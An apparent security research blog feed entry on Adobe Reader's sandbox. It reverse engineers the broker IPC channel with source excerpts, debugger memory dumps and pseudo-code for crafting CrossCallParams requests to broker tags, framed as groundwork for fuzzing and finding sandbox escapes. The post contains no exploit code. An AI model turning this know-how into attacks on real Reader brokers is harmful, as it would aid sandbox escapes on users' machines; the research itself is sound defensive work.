<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[]]></title>
  <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2020-08-10T13:11:36-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Digging the Adobe Sandbox - IPC Internals]]></title>
    <link href="http://hatRiot.github.io/blog/2020/08/07/digging-the-adobe-sandbox-internals/"/>
    <updated>2020-08-07T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2020/08/07/digging-the-adobe-sandbox-internals</id>
    <content type="html"><![CDATA[<p>This post kicks off a short series into reversing the Adobe Reader sandbox. I initially started this research early last year and have been working on it off and on since. This series will document the Reader sandbox internals, present a few tools for reversing/interacting with it, and a description of the results of this research. There may be quite a bit of content here, but I&rsquo;ll be doing a lot of braindumping. I find posts that document process, failure, and attempt to be far more insightful as a researcher than pure technical result.</p>

<p>I&rsquo;ve broken this research up into two posts. Maybe more, we&rsquo;ll see. The first here will detail the internals of the sandbox and introduce a few tools developed, and the second will focus on fuzzing and the results of that effort.</p>

<p>This post focuses primarily on the IPC channel used to communicate between the sandboxed process and the broker. I do not delve into how the policy engine works or many of the restrictions enabled.</p>

<h3>Introduction</h3>

<p>This is by no means the first dive into the Adobe Reader sandbox. Here are a few prior examples of great work:</p>

<p><a href="https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/000/058/original/A_Castle_Made_of_Sand-HES_final.pdf">2011 &ndash; A Castle Made of Sand (Richard Johnson)</a><br/>
<a href="https://docs.huihoo.com/blackhat/usa-2011/BH_US_11_SabanalYason_Readerx_Slides.pdf">2011 &ndash; Playing in the Reader X Sandbox (Paul Sabanal and Mark Yason)</a><br/>
<a href="https://media.blackhat.com/bh-eu-12/Liu_Lovet/bh-eu-12-Liu_Lovet-Sandworms-WP.pdf">2012 &ndash; Breeding Sandworms (Zhenhua Liu and Guillaume Lovet)</a><br/>
<a href="https://cansecwest.com/slides/2013/Adobe%20Sandbox.pdf">2013 &ndash; When the Broker is Broken (Peter Vreugdenhil)</a></p>

<p><code>Breeding Sandworms</code> was a particularly useful introduction to the sandbox, as it describes in some detail the internals of transaction and how they approached fuzzing the sandbox. I&rsquo;ll detail my approach and improvements in
part two of this series.</p>

<p>In addition, the ZDI crew of Abdul-Aziz Hariri, et al. have been hammering on
the Javascript side of things for what seems like forever (<a href="https://www.slideshare.net/codeblue_jp/abusing-adobe-readers-javascript-apis-by-abdulaziz-hariri-brian-gorenc-code-blue-2015">Abusing Adobe Reader&rsquo;s Javascript APIs</a>)
and have done some great work in this area.</p>

<p>After evaluating existing research, however, it seemed like there was more work to be done in a more open source fashion. Most sandbox escapes in Reader these days opt instead to target Windows itself via win32k/dxdiag/etc and not the sandbox broker. This makes some sense, but leaves a lot of attack surface unexplored.</p>

<p>Note that all research was done on Acrobat Reader DC 20.6.20034 on a Windows 10 machine. You can fetch installers for old versions of Adobe Reader
<a href="https://www.adobe.com/devnet-docs/acrobatetk/tools/ReleaseNotesDC/index.html">here</a>.
I highly recommend bookmarking this. One of my favorite things to do on a new target is pull previous bugs and affected versions and run through root cause and exploitation.</p>

<h3>Sandbox Internals Overview</h3>

<p>Adobe Reader&rsquo;s sandbox is known as protected mode and is on by default, but can be toggled on/off via preferences or the registry. Once Reader launches, a child process is spawned under low integrity and a shared memory
section mapped in. Inter-process communication (IPC) takes place over this channel, with the parent process acting as the broker.</p>

<p>Adobe actually published some of the sandbox source code to Github over 7 years ago, but it does not contain any of their policies or modern tag interfaces. It&rsquo;s useful for figuring out variables and function names during reversing,
and the source code is well written and full of useful comments, so I recommend <a href="https://github.com/adobe/chromium/tree/master/sandbox">pulling it up</a>.</p>

<p>Reader uses the Chromium sandbox (pre Mojo), and I recommend the following resources for the specifics here:</p>

<ul>
<li><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md">Official Documentation</a></li>
<li><a href="https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf">Whitepaper</a></li>
<li><a href="https://github.com/chromium/chromium/tree/master/sandbox/win/src">Source</a></li>
<li><a href="https://github.com/allpaca/chrome-sbx-db">allpaca Github repo of sandbox escapes</a></li>
</ul>


<p>These days it&rsquo;s known as the &ldquo;legacy IPC&rdquo; and has been replaced by <a href="https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md">Mojo</a> in Chrome. Reader actually uses Mojo to communicate between its RdrCEF (Chromium Embedded Framework) processes which handle cloud connectivity, syncing, etc. It&rsquo;s possible Adobe plans to replace the  broker legacy API with Mojo at some point, but this has not been announced/released yet.</p>

<p>We&rsquo;ll start by taking a brief look at how a target process is spawned, but the main focus of this post will be the guts of the IPC mechanisms in play. Execution of the child process first begins with <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/broker_services.cc#L276"><code>BrokerServicesBase::SpawnTarget</code></a>.
This function crafts the target process and its restrictions. Some of these
are described <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/security_level.h">here</a> in greater detail, but they are as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1. Create restricted token
</span><span class='line'> - via `CreateRestrictedToken`
</span><span class='line'> - Low integrity or AppContainer if available
</span><span class='line'>2. Create restricted job object
</span><span class='line'> - No RW to clipboard
</span><span class='line'> - No access to user handles in other processes
</span><span class='line'> - No message broadcasts
</span><span class='line'> - No global hooks
</span><span class='line'> - No global atoms table access
</span><span class='line'> - No changes to display settings
</span><span class='line'> - No desktop switching/creation
</span><span class='line'> - No ExitWindows calls
</span><span class='line'> - No SystemParamtersInfo
</span><span class='line'> - One active process
</span><span class='line'> - Kill on close/unhandled exception</span></code></pre></td></tr></table></div></figure>


<p>From here, the policy manager enforces interceptions, handled by the
<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/interception.cc">InterceptionManager</a>,
which handles hooking and rewiring various Win32 functions via the target process to the broker. According to documentation, this is not for security, but rather:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[..] designed to provide compatibility when code inside the sandbox cannot be modified to cope with sandbox restrictions. To save unnecessary IPCs, policy is also evaluated in the target process before making an IPC call, although this is not used as a security guarantee but merely a speed optimization.</span></code></pre></td></tr></table></div></figure>


<p>From here we can now take a look at how the IPC mechanisms between the target and broker process actually work.</p>

<p>The broker process is responsible for spawning the target process, creating a shared memory mapping, and initializing the requisite data structures. This shared memory mapping is the medium in which the broker and target communicate and exchange data. If the target wants to make an IPC call, the following happens at a high level:</p>

<ol>
<li>The target finds a channel in a free state</li>
<li>The target serializes the IPC call parameters to the channel</li>
<li>The target then signals an event object for the channel (ping event)</li>
<li>The target waits until a pong event is signaled</li>
</ol>


<p>At this point, the broker executes <code>ThreadPingEventReady</code>, the IPC processor entry point, where the following occurs:</p>

<ol>
<li>The broker deserializes the call arguments in the channel</li>
<li>Sanity checks the parameters and the call</li>
<li>Executes the callback</li>
<li>Writes the return structure back to the channel</li>
<li>Signals that the call is completed (pong event)</li>
</ol>


<p>There are 16 channels available for use, meaning that the broker can service up to 16 concurrent IPC requests at a time. The following diagram describes a high level view of this architecture:</p>

<p><img src="http://hatRiot.github.io/images/posts/2020/high-level-arch.png"></p>

<p>From the broker&rsquo;s perspective, a channel can be viewed like so:</p>

<p><img src="http://hatRiot.github.io/images/posts/2020/broker-shm-view.png"></p>

<p>In general, this describes what the IPC communication channel between the broker and target looks like. In the following sections we&rsquo;ll take a look at these in more technical depth.</p>

<h3>IPC Internals</h3>

<p>The IPC facilities are established via <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/target_process.cc#L250"><code>TargetProcess::Init</code></a>, and is really what we&rsquo;re most interested in. The following snippet describes how the shared memory mapping is created and established between the broker and target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  DWORD shared_mem_size = static_cast&lt;DWORD&gt;(shared_IPC_size +
</span><span class='line'>                                             shared_policy_size);
</span><span class='line'>  shared_section_.Set(::CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
</span><span class='line'>                                           PAGE_READWRITE | SEC_COMMIT,
</span><span class='line'>                                           0, shared_mem_size, NULL));
</span><span class='line'>  if (!shared_section_.IsValid()) {
</span><span class='line'>    return ::GetLastError();
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  DWORD access = FILE_MAP_READ | FILE_MAP_WRITE;
</span><span class='line'>  base::win::ScopedHandle target_shared_section;
</span><span class='line'>  if (!::DuplicateHandle(::GetCurrentProcess(), shared_section_,
</span><span class='line'>                         sandbox_process_info_.process_handle(),
</span><span class='line'>                         target_shared_section.Receive(), access, FALSE, 0)) {
</span><span class='line'>    return ::GetLastError();
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  void* shared_memory = ::MapViewOfFile(shared_section_,
</span><span class='line'>                                        FILE_MAP_WRITE|FILE_MAP_READ,
</span><span class='line'>                                        0, 0, 0);</span></code></pre></td></tr></table></div></figure>


<p>The calculated <code>shared_mem_size</code> in the source code here comes out to 65536 bytes, which isn&rsquo;t right. The shared section is actually 0x20000 bytes in modern Reader binaries.</p>

<p>Once the mapping is established and policies copied in, the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sharedmem_ipc_server.cc#L46">SharedMemIPCServer</a>
is initialized, and this is where things finally get interesting. <code>SharedMemIPCServer</code> initializes the ping/pong events for communication, creates channels, and registers callbacks.</p>

<p>The previous architecture diagram provides an overview of the structures and layout of the section at
runtime. In short, a <code>ServerControl</code> is a broker-side view of an IPC channel. It contains the server side event handles, pointers to both the channel and its buffer, and general information about the connected IPC endpoint. This structure is not visible to the target process and exists only in the broker.</p>

<p>A <code>ChannelControl</code> is the target process version of a <code>ServerControl</code>; it contains the target&rsquo;s event handles, the state of the channel, and information about where to find the channel buffer. This channel buffer is where the <code>CrossCallParams</code> can be found as well as the call return information after a successful IPC dispatch.</p>

<p>Let&rsquo;s walk through what an actual request looks like. Making an IPC request requires the target
to first prepare a <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L109"><code>CrossCallParams</code></a> structure. This is defined as a class, but we can model it as a struct:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>const size_t kExtendedReturnCount = 8;
</span><span class='line'>
</span><span class='line'>struct CrossCallParams {
</span><span class='line'>  uint32 tag_;
</span><span class='line'>  uint32 is_in_out_;
</span><span class='line'>  CrossCallReturn call_return;
</span><span class='line'>  size_t params_count_;
</span><span class='line'>};
</span><span class='line'>
</span><span class='line'>struct CrossCallReturn {
</span><span class='line'>  uint32 tag_;
</span><span class='line'>  uint32 call_outcome;
</span><span class='line'>  union {
</span><span class='line'>    NTSTATUS nt_status;
</span><span class='line'>    DWORD win32_result;
</span><span class='line'>  };
</span><span class='line'>
</span><span class='line'>  HANDLE handle;
</span><span class='line'>  uint32 extended_count;
</span><span class='line'>  MultiType extended[kExtendedReturnCount];
</span><span class='line'>};
</span><span class='line'>
</span><span class='line'>union MultiType {
</span><span class='line'>  uint32 unsigned_int;
</span><span class='line'>  void* pointer;
</span><span class='line'>  HANDLE handle;
</span><span class='line'>  ULONG_PTR ulong_ptr;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve also gone ahead and defined a few other structures needed to complete the picture. Note that the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L79">return structure</a>, <code>CrossCallReturn</code>, is embedded within the body of the <code>CrossCallParams</code>.</p>

<p>There&rsquo;s a great ASCII diagram provided in the sandbox source code that&rsquo;s highly instructive, and I&rsquo;ve duplicated it below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// [ tag                4 bytes]
</span><span class='line'>// [ IsOnOut            4 bytes]
</span><span class='line'>// [ call return       52 bytes]
</span><span class='line'>// [ params count       4 bytes]
</span><span class='line'>// [ parameter 0 type   4 bytes]
</span><span class='line'>// [ parameter 0 offset 4 bytes] ---delta to ---\
</span><span class='line'>// [ parameter 0 size   4 bytes]                |
</span><span class='line'>// [ parameter 1 type   4 bytes]                |
</span><span class='line'>// [ parameter 1 offset 4 bytes] ---------------|--\
</span><span class='line'>// [ parameter 1 size   4 bytes]                |  |
</span><span class='line'>// [ parameter 2 type   4 bytes]                |  |
</span><span class='line'>// [ parameter 2 offset 4 bytes] ----------------------\
</span><span class='line'>// [ parameter 2 size   4 bytes]                |  |   |
</span><span class='line'>// |---------------------------|                |  |   |
</span><span class='line'>// | value 0     (x bytes)     | &lt;--------------/  |   |
</span><span class='line'>// | value 1     (y bytes)     | &lt;-----------------/   |
</span><span class='line'>// |                           |                       |
</span><span class='line'>// | end of buffer             | &lt;---------------------/
</span><span class='line'>// |---------------------------|</span></code></pre></td></tr></table></div></figure>


<p>A tag is a dword indicating which function we&rsquo;re invoking (just a number between 1 and approximately 255, depending on your version). This is handled server side dynamically, and we&rsquo;ll explore that further later on.</p>

<p>Each parameter is then sequentially represented by a <code>ParamInfo</code> structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct ParamInfo {
</span><span class='line'>  ArgType type_;
</span><span class='line'>  ptrdiff_t offset_;
</span><span class='line'>  size_t size_;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>The offset is the delta value to a region of memory somewhere below the <code>CrossCallParams</code> structure. This is handled in the Chromium source code via the <code>ptrdiff_t</code> type.</p>

<p>Let&rsquo;s look at a call in memory from the target&rsquo;s perspective. Assume the channel buffer is at <code>0x2a10134</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:009&gt; dd 2a10000+0x134
</span><span class='line'>02a10134  00000003 00000000 00000000 00000000
</span><span class='line'>02a10144  00000000 00000000 000002cc 00000001
</span><span class='line'>02a10154  00000000 00000000 00000000 00000000
</span><span class='line'>02a10164  00000000 00000000 00000000 00000007
</span><span class='line'>02a10174  00000001 000000a0 00000086 00000002
</span><span class='line'>02a10184  00000128 00000004 00000002 00000130
</span><span class='line'>02a10194  00000004 00000002 00000138 00000004
</span><span class='line'>02a101a4  00000002 00000140 00000004 00000002</span></code></pre></td></tr></table></div></figure>


<p><code>0x2a10134</code> shows we&rsquo;re invoking tag 3, which carries 7 parameters (<code>0x2a10170</code>).
The first argument is type 0x1 (we&rsquo;ll describe types later on), is at delta
offset 0xa0, and is 0x86 bytes in size. Thus:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:009&gt; dd 2a10000+0x134+0xa0
</span><span class='line'>02a101d4  003f005c 005c003f 003a0043 0055005c
</span><span class='line'>02a101e4  00650073 00730072 0062005c 0061006a
</span><span class='line'>02a101f4  006a0066 0041005c 00700070 00610044
</span><span class='line'>02a10204  00610074 004c005c 0063006f 006c0061
</span><span class='line'>02a10214  006f004c 005c0077 00640041 0062006f
</span><span class='line'>02a10224  005c0065 00630041 006f0072 00610062
</span><span class='line'>02a10234  005c0074 00430044 0052005c 00610065
</span><span class='line'>02a10244  00650064 004d0072 00730065 00610073
</span><span class='line'>0:009&gt; du 2a10000+0x134+0xa0
</span><span class='line'>02a101d4  "\??\C:\Users\bjaff\AppData\Local"
</span><span class='line'>02a10214  "Low\Adobe\Acrobat\DC\ReaderMessa"
</span><span class='line'>02a10254  "ges"</span></code></pre></td></tr></table></div></figure>


<p>This shows the delta of the parameter data and, based on the parameter type, we know it&rsquo;s a unicode string.</p>

<p>With this information, we can craft a buffer targeting IPC tag 3 and move onto
sending it. To do this, we require the
<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sharedmem_ipc_client.h#L87"><code>IPCControl</code></a>
structure. This is a simple structure defined at the start of the IPC shared memory section:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct IPCControl {
</span><span class='line'>    size_t channels_count;
</span><span class='line'>    HANDLE server_alive;
</span><span class='line'>    ChannelControl channels[1];
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>And in the IPC shared memory section:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:009&gt; dd 2a10000
</span><span class='line'>02a10000  0000000f 00000088 00000134 00000001
</span><span class='line'>02a10010  00000010 00000014 00000003 00020134</span></code></pre></td></tr></table></div></figure>


<p>So we have 16 channels, a handle to <code>server_alive</code>, and the start of our
<code>ChannelControl</code> array.</p>

<p>The <code>server_alive</code> handle is a mutex used to signal if the server has crashed.
It&rsquo;s used during tag invocation in <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sharedmem_ipc_client.cc#L52"><code>SharedmemIPCClient::DoCall</code></a>, which we&rsquo;ll describe later on. For now, assume that if we <code>WaitForSingleObject</code> on this and it returns <code>WAIT_ABANDONED</code>, the server has crashed.</p>

<p><code>ChannelControl</code> is a structure that describes a channel, and is again defined as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct ChannelControl {
</span><span class='line'>  size_t channel_base;
</span><span class='line'>  volatile LONG state;
</span><span class='line'>  HANDLE ping_event;
</span><span class='line'>  HANDLE pong_event;
</span><span class='line'>  uint32 ipc_tag;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>The <code>channel_base</code> describes the channel&rsquo;s buffer, ie. where the <code>CrossCallParams</code> structure can be found. This is an offset from the base of the shared memory section.</p>

<p><code>state</code> is an enum that describes the state of the channel:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum ChannelState {
</span><span class='line'>  kFreeChannel = 1,
</span><span class='line'>  kBusyChannel,
</span><span class='line'>  kAckChannel,
</span><span class='line'>  kReadyChannel,
</span><span class='line'>  kAbandonnedChannel
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>The ping and pong events are, as previously described, used to signal to the opposite endpoint that data is ready for consumption. For example, when the client has written out its <code>CrossCallParams</code> and ready for the server, it signals:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  DWORD wait = ::SignalObjectAndWait(channel[num].ping_event,
</span><span class='line'>                                     channel[num].pong_event,
</span><span class='line'>                                     kIPCWaitTimeOut1,
</span><span class='line'>                                     FALSE);</span></code></pre></td></tr></table></div></figure>


<p>When the server has completed processing the request, the <code>pong_event</code> is signaled and the client reads back the call result.</p>

<p>A channel is fetched via <code>SharedMemIPCClient::LockFreeChannel</code> and is invoked when <code>GetBuffer</code> is called. This simply identifies a channel in the <code>IPCControl</code> array wherein <code>state == kFreeChannel</code>, and sets it to <code>kBusyChannel</code>. With a
channel, we can now write out our <code>CrossCallParams</code> structure to the shared memory buffer. Our target buffer begins at <code>channel-&gt;channel_base</code>.</p>

<p>Writing out the <code>CrossCallParams</code> has a few nuances. First, the number of
actual parameters is NUMBER_PARAMS+1. According to the source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Note that the actual number of params is NUMBER_PARAMS + 1
</span><span class='line'>// so that the size of each actual param can be computed from the difference
</span><span class='line'>// between one parameter and the next down. The offset of the last param
</span><span class='line'>// points to the end of the buffer and the type and size are undefined.</span></code></pre></td></tr></table></div></figure>


<p>This can be observed in the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L225"><code>CopyParamIn</code></a> function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>param_info_[index + 1].offset_ = Align(param_info_[index].offset_ +
</span><span class='line'>                                            size);
</span><span class='line'>param_info_[index].size_ = size;
</span><span class='line'>param_info_[index].type_ = type;</span></code></pre></td></tr></table></div></figure>


<p>Note the offset written is the offset for <code>index+1</code>. In addition, this offset is aligned. This is a pretty simple function that byte aligns the delta inside the channel buffer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Increases |value| until there is no need for padding given the 2*pointer
</span><span class='line'>// alignment on the platform. Returns the increased value.
</span><span class='line'>// NOTE: This might not be good enough for some buffer. The OS might want the
</span><span class='line'>// structure inside the buffer to be aligned also.
</span><span class='line'>size_t Align(size_t value) {
</span><span class='line'>  size_t alignment = sizeof(ULONG_PTR) * 2;
</span><span class='line'>    return ((value + alignment - 1) / alignment) * alignment;
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Because the Reader process is x86, the alignment is always 8.</p>

<p>The pseudo-code for writing out our <code>CrossCallParams</code> can be distilled into the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>write_uint(buffer,     tag);
</span><span class='line'>write_uint(buffer+0x4, is_in_out);
</span><span class='line'>
</span><span class='line'>// reserve 52 bytes for CrossCallReturn
</span><span class='line'>write_crosscall_return(buffer+0x8);
</span><span class='line'>
</span><span class='line'>write_uint(buffer+0x3c, param_count);
</span><span class='line'>
</span><span class='line'>// calculate initial delta 
</span><span class='line'>delta = ((param_count + 1) * 12) + 12 + 52;
</span><span class='line'>
</span><span class='line'>// write out the first argument's offset 
</span><span class='line'>write_uint(buffer + (0x4 * (3 * 0 + 0x11)), delta);
</span><span class='line'>
</span><span class='line'>for idx in range(param_count):
</span><span class='line'>    
</span><span class='line'>    write_uint(buffer + (0x4 * (3 * idx + 0x10)), type);
</span><span class='line'>    write_uint(buffer + (0x4 * (3 * idx + 0x12)), size);
</span><span class='line'>
</span><span class='line'>    // ...write out argument data. This varies based on the type
</span><span class='line'>
</span><span class='line'>    // calculate new delta
</span><span class='line'>    delta = Align(delta + size)
</span><span class='line'>    write_uint(buffer + (0x4 * (3 * (idx+1) + 0x11)), delta);
</span><span class='line'>
</span><span class='line'>// finally, write the tag out to the ChannelControl struct
</span><span class='line'>write_uint(channel_control-&gt;tag, tag);</span></code></pre></td></tr></table></div></figure>


<p>Once the <code>CrossCallParams</code> structure has been written out, the sandboxed process signals the <code>ping_event</code> and the broker is triggered.</p>

<p>Broker side handling is fairly straightforward. The server registers a <code>ping_event</code> handler during <code>SharedMemIPCServer::Init</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> thread_provider_-&gt;RegisterWait(this, service_context-&gt;ping_event,
</span><span class='line'>                                ThreadPingEventReady, service_context);</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/win2k_threadpool.cc#L11"><code>RegisterWait</code></a> is just a thread pool wrapper around a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-registerwaitforsingleobject"><code>RegisterWaitForSingleObject</code></a>.</p>

<p>The <code>ThreadPingEventReady</code> function marks the channel as <code>kAckChannel</code>, fetches a pointer to the provided buffer, and invokes <code>InvokeCallback</code>. Once this
returns, it copies the <code>CrossCallReturn</code> structure back to the channel and signals the <code>pong_event</code> mutex.</p>

